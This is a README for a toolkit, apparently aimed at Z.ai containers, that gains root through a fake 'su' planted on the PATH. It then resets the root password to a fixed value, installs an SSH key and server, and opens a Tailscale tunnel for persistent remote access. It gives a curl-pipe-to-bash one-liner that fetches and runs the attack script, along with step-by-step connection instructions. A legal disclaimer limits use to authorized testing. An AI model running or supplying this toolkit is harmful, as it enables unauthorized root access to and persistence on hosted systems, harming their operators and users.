# z.ai_pwn

> Privilege escalation & persistence toolkit for Z.ai containers.

Exploits a `su` binary hijack to escalate from unprivileged user to root, then sets up persistent SSH access via Tailscale tunnel.

## How It Works

1. **PATH hijack** — drops a fake `su` into `/usr/local/bin/` that runs before the real `/usr/bin/su`
2. **Credential reset** — when root (or cron/service) invokes `su`, the fake binary resets the root password and injects your SSH key
3. **SSH server** — installs and starts `openssh-server`
4. **Tailscale tunnel** — sets up a userspace Tailscale node so you can reach the container from anywhere

## Requirements

- Unprivileged shell inside the target container
- Container has internet access (for `apt-get` and Tailscale install)
- `/usr/local/bin` is in `$PATH` before `/usr/bin`

## Quick Start

One-liner — download and run directly inside the container:

```bash
curl -sL https://raw.githubusercontent.com/Mffff4/z.ai_pwn/main/pwn.sh | bash -s '<your-ssh-public-key>'
```

## Usage

```bash
# Or copy the script manually, then:
chmod +x pwn.sh
./pwn.sh '<your-ssh-public-key>'
```

**Example:**

```bash
./pwn.sh 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... user@host'
```

The script will wait up to 60 seconds for a privileged process to call `su`. Once triggered:

```
[+] PWNED! Got root
[+] Root password: 12341234
[+] SSH key installed

[*] Connect via Tailscale:
    URL: https://login.tailscale.com/...
    After auth: ssh root@<tailscale-ip>
```

## Connect

1. Open the Tailscale login URL printed by the script
2. Authenticate in your browser
3. SSH into the container:

```bash
ssh root@<tailscale-ip>
```

Or use the fallback password (`12341234`) if SSH keys aren't working.

## Legal Disclaimer

> **This tool is provided for authorized security research, penetration testing, and CTF competitions only.**

- You may **only** use this tool on systems you own or have **explicit written permission** to test.
- Unauthorized access to computer systems is a criminal offense in most jurisdictions (e.g., CFAA in the US, Computer Misuse Act in the UK).
- The author assumes **no liability** for misuse of this tool. You are solely responsible for your actions.
- By using this software, you agree that you have obtained proper authorization from the system owner.

If you believe this tool is being used maliciously, please see [SECURITY.md](SECURITY.md).

## License

MIT
